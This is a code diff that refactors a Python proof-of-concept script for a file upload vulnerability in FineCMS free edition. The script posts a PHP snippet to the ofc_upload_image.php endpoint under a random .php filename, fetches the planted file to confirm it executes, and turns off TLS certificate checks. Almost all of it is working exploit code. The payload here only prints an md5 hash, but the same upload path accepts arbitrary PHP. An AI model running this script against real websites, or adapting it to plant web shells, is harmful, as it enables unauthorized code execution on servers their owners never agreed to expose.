@@ -10,14 +10,7 @@ import sys
 import random
 import requests
 import warnings
-  
-  
-
-class uploadfile:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['FineCMS免费版文件上传漏洞', '', '']
         headers = {
             "Content-Type":"application/oct",
@@ -26,8 +19,8 @@ class uploadfile:
         payload = "/dayrui/libraries/Chart/ofc_upload_image.php?name="
         post_data = '''<?print(md5(1234));?>'''
         filename = "test" + str(random.randrange(1000,9999)) + ".php"
-        vulnurl = self.url + payload + filename
-        shellpath = self.url + "/dayrui/libraries/tmp-upload-images/"+filename
+        vulnurl = url + payload + filename
+        shellpath = url + "/dayrui/libraries/tmp-upload-images/"+filename
         try:
             req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
             req2 = requests.get(shellpath, headers=headers, timeout=10, verify=False)
@@ -43,5 +36,5 @@ class uploadfile:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = uploadfile(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
